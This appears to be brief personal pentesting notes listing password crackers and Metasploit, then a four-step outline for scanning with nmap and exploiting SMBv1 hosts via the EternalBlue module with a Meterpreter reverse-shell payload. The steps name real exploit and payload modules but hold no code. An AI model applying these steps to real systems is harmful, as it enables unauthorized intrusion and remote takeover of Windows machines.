
# john the ripper 

# hashcat
# msfconsole for windoows

#Methodology
1. run nmap scan and for open ports
2. if you find smbv1 then it might be vulnerable to ms17-010 eternalblue exploit
3. use exploit/windows/smb/ms17_010_eternalblue and set payload to windows/meterpreter/reverse_tcp
4. configure everything and use the command exploit 
